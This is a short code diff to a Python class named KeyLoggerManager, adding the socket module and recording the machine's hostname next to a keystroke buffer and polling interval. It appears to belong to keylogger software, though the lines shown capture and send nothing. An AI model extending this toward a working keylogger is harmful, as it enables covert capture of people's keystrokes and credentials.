@@ -1,9 +1,11 @@
 import threading
 import time
+import socket
 
 class KeyLoggerManager:
     def __init__(self, keylogger_service, interval=5):
         self.keylogger_service = keylogger_service
+        self.machine_name = socket.gethostname()
         self.interval = interval
         self.buffer = []
         self.running = False
